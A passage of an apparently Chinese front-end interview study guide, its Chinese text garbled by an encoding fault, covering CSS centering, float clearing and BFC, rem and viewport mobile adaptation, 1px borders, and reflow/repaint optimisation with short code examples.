class="hljs-number">0</span> auto; <span class="hljs-comment">/* ç»å…¸auto margins */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flexbox æ–¹æ¡ˆ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* ä¸»è½´å±…ä¸­ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>grid æ–¹æ¡ˆ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">place-items</span>: center; <span class="hljs-comment">/* ç®€å†™å±æ€§ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å‚ç›´å±…ä¸­"><a href="#å‚ç›´å±…ä¸­" class="headerlink" title="å‚ç›´å±…ä¸­"></a>å‚ç›´å±…ä¸­</h3><p><strong>å•è¡Œæ–‡æœ¬</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">100px</span>; <span class="hljs-comment">/* è¡Œé«˜=å®¹å™¨é«˜åº¦ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¡¨æ ¼å•å…ƒæ ¼æ–¹å¼</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: table-cell;<br>  <span class="hljs-attribute">vertical-align</span>: middle; <span class="hljs-comment">/* å‚ç›´å±…ä¸­ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>flexbox æ–¹æ¡ˆ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/* äº¤å‰è½´å±…ä¸­ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»å¯¹å®šä½ + è´Ÿè¾¹è·ï¼ˆä¼ ç»Ÿæ–¹æ¡ˆï¼‰</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;<br>  <span class="hljs-attribute">margin-top</span>: -<span class="hljs-number">50px</span>; <span class="hljs-comment">/* é«˜åº¦çš„ä¸€åŠ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å®Œå…¨å±…ä¸­ï¼ˆæ°´å¹³-å‚ç›´ï¼‰"><a href="#å®Œå…¨å±…ä¸­ï¼ˆæ°´å¹³-å‚ç›´ï¼‰" class="headerlink" title="å®Œå…¨å±…ä¸­ï¼ˆæ°´å¹³ + å‚ç›´ï¼‰"></a>å®Œå…¨å±…ä¸­ï¼ˆæ°´å¹³ + å‚ç›´ï¼‰</h3><p><strong>flexbox ç»ˆææ–¹æ¡ˆ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">justify-content</span>: center;<br>  <span class="hljs-attribute">align-items</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>grid ç»ˆææ–¹æ¡ˆ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">place-content</span>: center; <span class="hljs-comment">/* ç®€å†™å±æ€§ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»å¯¹å®šä½ + transform</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>); <span class="hljs-comment">/* è‡ªé€‚åº”å®½é«˜ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç»å¯¹å®šä½ + margin auto</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">inset</span>: <span class="hljs-number">0</span>; <span class="hljs-comment">/* å…¨æ–¹å‘0 */</span><br>  <span class="hljs-attribute">margin</span>: auto;<br>  <span class="hljs-attribute">width</span>: fit-content;<br>  <span class="hljs-attribute">height</span>: fit-content;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç‰¹æ®Šåœºæ™¯æ–¹æ¡ˆ"><a href="#ç‰¹æ®Šåœºæ™¯æ–¹æ¡ˆ" class="headerlink" title="ç‰¹æ®Šåœºæ™¯æ–¹æ¡ˆ"></a>ç‰¹æ®Šåœºæ™¯æ–¹æ¡ˆ</h3><p><strong>è§†å£å±…ä¸­ï¼ˆvw&#x2F;vhï¼‰</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">position</span>: fixed;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">50vh</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50vw</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(-<span class="hljs-number">50%</span>, -<span class="hljs-number">50%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¤šè¡Œæ–‡æœ¬å±…ä¸­</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">margin</span>: auto; <span class="hljs-comment">/* ç¥å¥‡çš„å°æŠ€å·§ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æµ®åŠ¨å…ƒç´ å±…ä¸­</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table;<br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">float</span>: left;<br>  <span class="hljs-attribute">position</span>: relative;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(-<span class="hljs-number">50%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-3-æ¸…é™¤æµ®åŠ¨çš„æ–¹æ³•ä¸-BFC-åº”ç”¨"><a href="#6-3-æ¸…é™¤æµ®åŠ¨çš„æ–¹æ³•ä¸-BFC-åº”ç”¨" class="headerlink" title="6.3 æ¸…é™¤æµ®åŠ¨çš„æ–¹æ³•ä¸ BFC åº”ç”¨"></a>6.3 æ¸…é™¤æµ®åŠ¨çš„æ–¹æ³•ä¸ BFC åº”ç”¨</h2><h3 id="æ¸…é™¤æµ®åŠ¨çš„æ ¸å¿ƒæ–¹æ³•"><a href="#æ¸…é™¤æµ®åŠ¨çš„æ ¸å¿ƒæ–¹æ³•" class="headerlink" title="æ¸…é™¤æµ®åŠ¨çš„æ ¸å¿ƒæ–¹æ³•"></a>æ¸…é™¤æµ®åŠ¨çš„æ ¸å¿ƒæ–¹æ³•</h3><p><strong>ç»å…¸ clear fix æ–¹æ¡ˆï¼ˆæœ€å¯é ï¼‰</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: block;<br>  <span class="hljs-attribute">clear</span>: both; <span class="hljs-comment">/* å…³é”®å±æ€§ */</span><br>&#125;<br><span class="hljs-comment">/* å…¼å®¹IE6/7 */</span><br><span class="hljs-selector-class">.clearfix</span> &#123;<br>  *<span class="hljs-attribute">zoom</span>: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€‚ç”¨åœºæ™¯ï¼šæ‰€æœ‰éœ€è¦æ¸…é™¤æµ®åŠ¨çš„å®¹å™¨</p><p><strong>åˆ›å»º BFC å®¹å™¨ï¼ˆç°ä»£æ–¹æ¡ˆï¼‰</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* æˆ– auto/scroll */</span><br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* æœ€çº¯å‡€çš„BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŠ¿ï¼šæ— éœ€é¢å¤– HTML å…ƒç´ </p><p><strong>ç©º div æ³•ï¼ˆä¸æ¨èä½†å¸¸è§ï¼‰</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;float-left&quot;&gt;&lt;/div&gt;<br>&lt;div style=&quot;clear: both;&quot;&gt;&lt;/div&gt; &lt;!-- æ¸…é™¤æµ®åŠ¨ --&gt;<br></code></pre></td></tr></table></figure><p><strong>ä¼ªå…ƒç´  + table å¸ƒå±€ï¼ˆå…¼å®¹æ€§æœ€ä½³ï¼‰</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">display</span>: table;<br>  <span class="hljs-attribute">clear</span>: both;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="BFC-åœ¨æ¸…é™¤æµ®åŠ¨ä¸Šçš„åº”ç”¨"><a href="#BFC-åœ¨æ¸…é™¤æµ®åŠ¨ä¸Šçš„åº”ç”¨" class="headerlink" title="BFC åœ¨æ¸…é™¤æµ®åŠ¨ä¸Šçš„åº”ç”¨"></a>BFC åœ¨æ¸…é™¤æµ®åŠ¨ä¸Šçš„åº”ç”¨</h3><p><strong>æ ¸å¿ƒåŸç†</strong></p><p>å½“å…ƒç´ åˆ›å»º BFC æ—¶ï¼Œä¼šå½¢æˆç‹¬ç«‹çš„å¸ƒå±€ç¯å¢ƒï¼Œå¿…é¡»åŒ…å«å…¶å†…çš„æ‰€æœ‰æµ®åŠ¨å…ƒç´ ï¼Œä»¥é¿å…çˆ¶å®¹å™¨é«˜åº¦å¡Œé™·ã€‚è¿™æ˜¯ CSS è§„èŒƒä¸­æ˜ç¡®è§„å®šçš„ BFC ç‰¹æ€§ä¹‹ä¸€ã€‚</p><p><strong>å…·ä½“å®ç°æ–¹æ³•</strong></p><p>ï¼ˆ1ï¼‰overflowï¼ˆæœ€å¸¸ç”¨ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: hidden; <span class="hljs-comment">/* æˆ– auto/scroll */</span><br>  <span class="hljs-comment">/* è§¦å‘BFC */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç‰¹ç‚¹ï¼š</p><ul><li>å…¼å®¹æ€§å¥½ï¼ˆIE7+ï¼‰</li><li>å¯èƒ½æ„å¤–è£å‰ªå†…å®¹æˆ–äº§ç”Ÿæ»šåŠ¨æ¡</li></ul><p>ï¼ˆ2ï¼‰display: flow-rootï¼ˆç°ä»£æ–¹æ¡ˆï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flow-root; <span class="hljs-comment">/* ä¸“ä¸ºæ¸…é™¤æµ®åŠ¨è®¾è®¡ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼˜åŠ¿ï¼š</p><ul><li>æ— å‰¯ä½œç”¨ï¼ˆä¸ä¼šè£å‰ªå†…å®¹ï¼‰</li><li>è¯­ä¹‰æ˜ç¡®ï¼ˆChrome58+&#x2F;Firefox52+&#x2F;Edge16+ï¼‰</li></ul><p>ï¼ˆ3ï¼‰æµ®åŠ¨å…ƒç´ çˆ¶å®¹å™¨ï¼ˆè‡ªæ¸…é™¤ï¼‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">float</span>: left; <span class="hljs-comment">/* è‡ªèº«æµ®åŠ¨ä¹Ÿåˆ›å»ºBFC */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* ä¿æŒå®½åº¦ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>é€‚ç”¨åœºæ™¯ï¼šéœ€è¦å…¼å®¹ IE6&#x2F;7 çš„å¤è€é¡¹ç›®</p><p>ï¼ˆ4ï¼‰display è¡¨æ ¼å±æ€§</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: table; <span class="hljs-comment">/* æˆ– inline-table/table-cell */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* éœ€è¦æŒ‡å®šå®½åº¦ */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šä¼šæ”¹å˜å…ƒç´ é»˜è®¤æ˜¾å¼ç‰¹æ€§</p><h2 id="6-4-å“åº”å¼è®¾è®¡ä¸ç§»åŠ¨ç«¯é€‚é…ï¼ˆREMã€Viewportï¼‰"><a href="#6-4-å“åº”å¼è®¾è®¡ä¸ç§»åŠ¨ç«¯é€‚é…ï¼ˆREMã€Viewportï¼‰" class="headerlink" title="6.4 å“åº”å¼è®¾è®¡ä¸ç§»åŠ¨ç«¯é€‚é…ï¼ˆREMã€Viewportï¼‰"></a>6.4 å“åº”å¼è®¾è®¡ä¸ç§»åŠ¨ç«¯é€‚é…ï¼ˆREMã€Viewportï¼‰</h2><h3 id="å¦‚ä½•åˆ©ç”¨-rem-å®ç°ç§»åŠ¨ç«¯é€‚é…"><a href="#å¦‚ä½•åˆ©ç”¨-rem-å®ç°ç§»åŠ¨ç«¯é€‚é…" class="headerlink" title="å¦‚ä½•åˆ©ç”¨ rem å®ç°ç§»åŠ¨ç«¯é€‚é…"></a>å¦‚ä½•åˆ©ç”¨ rem å®ç°ç§»åŠ¨ç«¯é€‚é…</h3><p><strong>æ ‡å‡†ç­”æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€è®¾ç½®æ ¹å­—ä½“å¤§å°ï¼ˆæ¨è1rem=10pxæ¯”ä¾‹ï¼‰</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">fontSize</span> = <br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">clientWidth</span> / <span class="hljs-number">7.5</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <br><span class="hljs-comment">// è®¾è®¡ç¨¿750pxæ—¶ï¼Œ1rem=100px</span><br></code></pre></td></tr></table></figure><p><strong>é…å¥— CSS</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é…åˆPostCSSæ’ä»¶è‡ªåŠ¨è½¬æ¢ */</span><br><span class="hljs-selector-class">.btn</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">1.6rem</span>; <span class="hljs-comment">/* è®¾è®¡ç¨¿160px â†’ 1.6rem */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿½é—®</strong></p><ul><li>ä¸ºä»€ä¹ˆç”¨ 7.5ï¼Ÿï¼šè®¾è®¡ç¨¿å®½åº¦750px Ã· 100ï¼ˆç›®æ ‡remå€¼ï¼‰ &#x3D; 7.5</li><li>å¦‚ä½•è§£å†³å­—ä½“é—ªçƒï¼Ÿï¼šæ·»åŠ CSSå…ˆè®¾ç½®é»˜è®¤å­—å·</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">html</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-number">50px</span> &#125; <span class="hljs-comment">/* é»˜è®¤å€¼ */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">375px</span>)&#123; <span class="hljs-selector-tag">html</span> &#123; <span class="hljs-attribute">font-size</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">100vw</span> / <span class="hljs-number">7.5</span>) &#125; &#125;<br></code></pre></td></tr></table></figure><h3 id="viewport-è¿›é˜¶"><a href="#viewport-è¿›é˜¶" class="headerlink" title="viewport è¿›é˜¶"></a>viewport è¿›é˜¶</h3><p><strong>Qï¼š<code>&lt;meta name=&quot;viewport&quot;&gt;</code>å„å‚æ•°çš„ä½œç”¨ï¼Ÿ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;meta name=&quot;viewport&quot; <br>  content=&quot;width=device-width, <br>          initial-scale=1.0,<br>          maximum-scale=1.0,<br>          user-scalable=no,<br>          viewport-fit=cover&quot;&gt;<br></code></pre></td></tr></table></figure><ul><li>width&#x3D;device-widthï¼šè§†å£&#x3D;è®¾å¤‡å®½åº¦ï¼ˆé¿å…é»˜è®¤980pxç¼©æ”¾ï¼‰</li><li>initial-scale&#x3D;1.0ï¼šåˆå§‹ç¼©æ”¾æ¯”ä¾‹</li><li>viewport-fit&#x3D;coverï¼šå…¨é¢å±é€‚é…ï¼ˆiOSä¸“å±ï¼‰</li></ul><p>é™·é˜±ï¼šä¸ºä»€ä¹ˆ andriod ä¸éœ€è¦è®¾ç½® viewport-fitï¼Ÿ</p><p>Androidç³»ç»Ÿä¼šè‡ªåŠ¨å¤„ç†åˆ˜æµ·å±ï¼Œè€ŒiOSéœ€è¦æ˜¾å¼å£°æ˜</p><h3 id="å¦‚ä½•å®ç°é«˜æ¸…å±ä¸‹çš„çœŸå®-1px-è¾¹æ¡†ï¼Ÿ"><a href="#å¦‚ä½•å®ç°é«˜æ¸…å±ä¸‹çš„çœŸå®-1px-è¾¹æ¡†ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°é«˜æ¸…å±ä¸‹çš„çœŸå® 1px è¾¹æ¡†ï¼Ÿ"></a>å¦‚ä½•å®ç°é«˜æ¸…å±ä¸‹çš„çœŸå® 1px è¾¹æ¡†ï¼Ÿ</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.border-1px</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>&#125;<br><span class="hljs-selector-class">.border-1px</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">0</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">height</span>: <span class="hljs-number">1px</span>;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#000</span>;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scaleY</span>(<span class="hljs-number">0.5</span>);<br>  <span class="hljs-attribute">transform-origin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŸç†ï¼šåˆ©ç”¨ transform ç¼©æ”¾ç‰©ç†åƒç´ ï¼Œé¿å…ç›´æ¥ä½¿ç”¨ 0.5px çš„å…¼å®¹æ€§é—®é¢˜</p><h2 id="6-5-CSS-æ¸²æŸ“ä¼˜åŒ–ï¼ˆå‡å°‘é‡æ’ã€é‡ç»˜ï¼‰"><a href="#6-5-CSS-æ¸²æŸ“ä¼˜åŒ–ï¼ˆå‡å°‘é‡æ’ã€é‡ç»˜ï¼‰" class="headerlink" title="6.5 CSS æ¸²æŸ“ä¼˜åŒ–ï¼ˆå‡å°‘é‡æ’ã€é‡ç»˜ï¼‰"></a>6.5 CSS æ¸²æŸ“ä¼˜åŒ–ï¼ˆå‡å°‘é‡æ’ã€é‡ç»˜ï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ-1"><a href="#åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ-1" class="headerlink" title="åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ"></a>åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ</h3><p><strong>Qï¼šè§£é‡Šé‡æ’ï¼ˆreflowï¼‰å’Œé‡ç»˜ï¼ˆrepaintï¼‰çš„åŒºåˆ«</strong></p><ul><li>é‡æ’ï¼šå‡ ä½•å±æ€§å˜æ›´ï¼ˆå®½&#x2F;é«˜&#x2F;ä½ç½®ç­‰ï¼‰å¯¼è‡´çš„å¸ƒå±€é‡æ–°è®¡ç®—ï¼Œä»£ä»·é«˜æ˜‚</li><li>é‡ç»˜ï¼šå¤–è§‚å±æ€§å˜åŒ–ï¼ˆèƒŒæ™¯&#x2F;é¢œè‰²ç­‰ï¼‰å¯¼è‡´çš„åƒç´ é‡ç»˜ï¼Œä¸æ¶‰åŠå¸ƒå±€å˜åŒ–</li><li>å…³é”®å·®å¼‚ï¼šé‡æ’å¿…å®šè§¦å‘é‡ç»˜ï¼Œåä¹‹ä¸ä¼š</li></ul><p><strong>Qï¼šå“ªäº›CSSå±æ€§ä¼šè§¦å‘é‡æ’ï¼Ÿå“ªäº›ä»…è§¦å‘é‡ç»˜ï¼Ÿ</strong></p><table><thead><tr><th align="left">é‡æ’è§¦å‘å±æ€§</th><th align="left">ä»…é‡ç»˜å±æ€§</th></tr></thead><tbody><tr><td align="left">width&#x2F;height</td><td align="left">color</td></tr><tr><td align="left">margin&#x2F;padding</td><td align="left">background</td></tr><tr><td align="left">display</td><td align="left">border-radius</td></tr><tr><td align="left">font-size</td><td align="left">box-shadow</td></tr><tr><td align="left">è·å–å¸ƒå±€å±æ€§(offsetTop)</td><td align="left">visibility: hidden</td></tr></tbody></table><h3 id="æ·±åº¦åŸç†è€ƒå¯Ÿ"><a href="#æ·±åº¦åŸç†è€ƒå¯Ÿ" class="headerlink" title="æ·±åº¦åŸç†è€ƒå¯Ÿ"></a>æ·±åº¦åŸç†è€ƒå¯Ÿ</h3><p><strong>Qï¼šæµè§ˆå™¨æ¸²æŸ“ç®¡çº¿ä¸­å¦‚ä½•é¿å…å¸ƒå±€æŠ–åŠ¨ï¼ˆLayout Thrashingï¼‰ï¼Ÿ</strong></p><p>è¯»å†™åˆ†ç¦»åŸåˆ™ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯å†™æ³•ï¼ˆäº¤æ›¿è¯»å†™å¯¼è‡´å¤šæ¬¡é‡æ’ï¼‰</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">100</span>; i++) &#123;<br>  el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = i + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(el.<span class="hljs-property">offsetWidth</span>);<br>&#125;<br><br><span class="hljs-comment">// æ­£ç¡®å†™æ³•ï¼ˆæ‰¹é‡è¯»å†™ï¼‰</span><br><span class="hljs-keyword">let</span> widths = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">100</span>; i++) &#123;<br>  el.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = i + <span class="hljs-string">&#x27;px&#x27;</span>;<br>  widths.<span class="hljs-title function_">push</span>(i);<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(widths);<br></code></pre></td></tr></table></figure><p><strong>Qï¼šå¦‚ä½•åˆ©ç”¨CSS Containmentä¼˜åŒ–æ¸²æŸ“æ€§èƒ½ï¼Ÿ</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 